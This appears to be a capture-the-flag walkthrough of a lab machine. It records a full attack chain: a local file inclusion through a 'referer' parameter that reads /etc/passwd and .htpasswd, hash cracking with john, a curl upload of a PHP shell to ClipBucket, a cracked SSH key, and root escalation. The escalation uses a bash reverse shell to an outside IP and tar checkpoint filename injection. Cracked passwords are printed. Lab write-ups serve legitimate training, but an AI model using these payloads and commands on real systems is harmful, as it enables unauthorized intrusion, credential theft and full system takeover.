start with nmap
80
22


http 80

site uses php.

there is newsletter subcription for but it doesn't do anything.

sign in page :

http://10.10.142.232/login.html?login=admin&password=admin

test for sql injection : failed.

added vulnnet.thm in the /etc/hosts

fuff for subdomains got.

broadcast.vulnnet.thm : has basic authentication.

after some enumberation on vulnnet.thm we found a js file .

http://vulnnet.thm/js/index__d8338055.js

lets use buetifier to make readble js.

`js-beautify index__d8338055.js > index_readble.js`

in this javascript code we found a parameter `referer`

```js
    }, n.o = function(e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0)
}({
    0: function(e, t, n) {
        e.exports = n("O14P")

```

simple `/etc/passwd` we got lfi.

also we found user `server-management`

http://vulnnet.thm/index.php?referer=/etc/passwd

`/etc/apache2/sites-enabled/000-default.conf` file in `/etc/apache2/.htpasswd`.

developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0

lets crack the hash.

```
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (?)
1g 0:00:00:17 DONE (2022-01-04 09:02) 0.05672g/s 122583p/s 122583c/s 122583C/s 9982..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed


```

creds : `developers : 9972761drmfsls`

after loggin clipbucket presented by webpage.

clipbucket v4 is used. lets search for explot.

shell is located in 

```
curl -u developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php"

```

http://broadcast.vulnnet.thm/files/photos/2022/01/04/

found ssh-backup.tar.gz file in /var/backups

unzip file got id_rsa encrypted. 

decrypt with ssh2john and john. : oneTWO3gOyac

let try server-management ssh account with key.

/var/opt/backupsrv.sh for root user.

***

privs

```language

echo " bash -c 'bash -i >& /dev/tcp/10.11.57.82/1337 0>&1'" > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"

echo "" > --checkpoint=1

```

